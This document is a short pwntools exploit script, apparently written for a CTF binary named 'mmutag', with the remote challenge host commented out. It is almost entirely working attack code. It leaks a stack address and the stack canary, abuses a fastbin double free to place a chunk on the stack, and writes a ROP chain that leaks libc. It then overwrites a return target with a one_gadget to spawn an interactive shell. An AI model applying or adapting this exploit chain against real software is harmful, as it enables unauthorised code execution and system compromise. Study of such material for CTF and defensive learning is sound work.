from pwn import *


context.log_level="debug"

def add(id,note):
     p.sendlineafter(":\n","1")
     p.sendlineafter("id:\n",str(id))
     p.sendafter("content\n",note)

def delete(id):
     p.sendlineafter(":\n","2")
     p.sendlineafter("id:\n",str(id))

p=process("./mmutag")
#p=remote("183.129.189.62",58804)
p.sendlineafter(": ","lfynb")
p.recvuntil("tag: ")
stack_addr=int(p.recvuntil(":")[:-1],16)
p.sendlineafter(":\n\n","2")

p.sendlineafter(":\n","3")
p.send("a"*0x19)
p.recvuntil("a"*0x19)
canary="\x00"+p.recv(7)
print hex(u64(canary))

p.sendlineafter(":\n","3")
p.send(p64(0)+p64(0x71))

add(1,"ylg")
add(2,"ylg")
delete(1)
delete(2)
delete(1)

add(3,p64(stack_addr-0x7fffffffe610+0x7fffffffe5d0))
add(4,"aaaa")
add(5,"aaaa")
add(6,"b"*8+canary+p64(0x602050)+p64(0x400d23)+p64(0x602018)+p64(0x4006B0)+p64(0x400B44)+p64(0)*6)
p.sendlineafter(":\n","4")
libc=u64(p.recv(6)+"\x00\x00")-0x7ffff7a91540+0x7ffff7a0d000
#gdb.attach(p)
p.send(p64(libc+0x4527a)*2)
print hex(libc)
#gdb.attach(p)
p.interactive()